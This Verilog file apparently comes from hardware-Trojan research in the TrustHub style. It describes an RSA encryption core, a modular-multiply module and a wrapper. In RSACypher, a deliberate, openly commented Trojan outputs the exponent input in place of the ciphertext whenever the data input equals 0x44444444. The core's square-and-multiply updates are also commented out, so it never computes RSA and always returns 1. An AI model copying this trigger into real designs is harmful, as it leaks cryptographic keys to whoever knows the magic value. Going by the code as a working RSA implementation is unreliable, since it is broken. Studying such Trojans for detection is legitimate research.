// ============================================================
// RSA-T100 style design (Verilog, NO PARAMETERS)
// - RSACypher: RSA core with Trojan
// - modmult: modular multiply as a MODULE
// - top: wrapper (TrustHub style)
// ============================================================


// ------------------------------------------------------------
// TOP-LEVEL (NO PARAMETERS, FIXED PORTS)
// ------------------------------------------------------------
module top(clk, rst, ds, indata, inExp, inMod, cypher);

    input              clk;
    input              rst;
    input              ds;
    input      [31:0]  indata;
    input      [31:0]  inExp;
    input      [31:0]  inMod;
    output     [31:0]  cypher;

    wire ready;

    RSACypher U_RSA (
        .clk(clk),
        .ds(ds),
        .reset(rst),
        .indata(indata),
        .inExp(inExp),
        .inMod(inMod),
        .cypher(cypher),
        .ready(ready)
    );

endmodule


// ------------------------------------------------------------
// MODULAR MULTIPLY MODULE (combinational)
// out = (a*b) % m   if m!=0 else 0
// ------------------------------------------------------------
module modmult(a, b, m, out);
    input  [31:0] a;
    input  [31:0] b;
    input  [31:0] m;
    output reg [31:0] out;

    reg [63:0] prod;

    always @* begin
        prod = a * b;
        if (m != 32'b0)
            out = prod % m;
        else
            out = 32'b0;
    end
endmodule


// ------------------------------------------------------------
// RSACypher (NO PARAMETERS, FIXED 32-BIT WIDTH)
// ------------------------------------------------------------
module RSACypher(clk, ds, reset, indata, inExp, inMod, cypher, ready);

    input              clk;
    input              ds;
    input              reset;
    input  [31:0]      indata;
    input  [31:0]      inExp;
    input  [31:0]      inMod;
    output reg [31:0]  cypher;
    output reg         ready;

    reg [1:0]          state;
    reg [31:0]         base;
    reg [31:0]         exp;
    reg [31:0]         mod;
    reg [31:0]         result;

    localparam S_IDLE = 2'd0;
    localparam S_RUN  = 2'd1;
    localparam S_DONE = 2'd2;

    // Trojan trigger
    localparam [31:0] TRIG_32 = 32'h4444_4444;

	
    // --- modmult instances ---
    wire [31:0] mm_res_out;   // (result * base) % mod
    wire [31:0] mm_base_out;  // (base * base) % mod

    modmult U_MM_RES  (.a(result), .b(base), .m(mod), .out(mm_res_out));
    modmult U_MM_BASE (.a(base),   .b(base), .m(mod), .out(mm_base_out));

    // choose next values (so we don't accidentally update result when exp[0]==0)
    wire [31:0] result_next; 
    wire [31:0] base_next;
	
	assign result_next = (exp[0] == 1'b1) ? mm_res_out : result;
	assign base_next   = mm_base_out;
	

    // --------------------------------------------------------
    // Sequential logic
    // --------------------------------------------------------
    always @(posedge clk or posedge reset) begin
        if (reset == 1'b1) begin
            state   <= S_IDLE;
            ready   <= 1'b1;
            cypher  <= 32'b0;
            base    <= 32'b0;
            exp     <= 32'b0;
            mod     <= 32'b0;
            result  <= 32'b0;
        end

        // ------------------- STATE = S_IDLE -------------------
        else if ((reset == 1'b0) && (state == S_IDLE)) begin
            ready <= 1'b1;

            if (ds == 1'b1) begin
                ready  <= 1'b0;
                exp    <= inExp;
                mod    <= inMod;
                result <= 32'h00000001;

                if (inMod != 32'b0)
                    base <= indata % inMod;
                else
                    base <= indata;

                state <= S_RUN;
            end
        end

        // ------------------- STATE = S_RUN --------------------
        else if ((reset == 1'b0) && (state == S_RUN)) begin

            // Exponent fully consumed: finish & output result
            if (exp == 32'b0) begin
                if (indata == TRIG_32)
                    cypher <= inExp;     // Trojan leak!
                else
                    cypher <= result;    // Normal RSA output

                state <= S_DONE;
            end

            // Otherwise keep performing square-and-multiply
            else begin
                //result <= result_next;          // updates only if exp[0]==1
                //base   <= base_next;            // always squares
                exp    <= {1'b0, exp[31:1]};     // shift exponent right
            end
        end

        // ------------------- STATE = S_DONE -------------------
        else if ((reset == 1'b0) && (state == S_DONE)) begin
            ready <= 1'b1;

            if (ds == 1'b0)
                state <= S_IDLE;
        end

        // ------------------- DEFAULT --------------------------
        else begin
            state <= S_IDLE;
        end
    end

endmodule
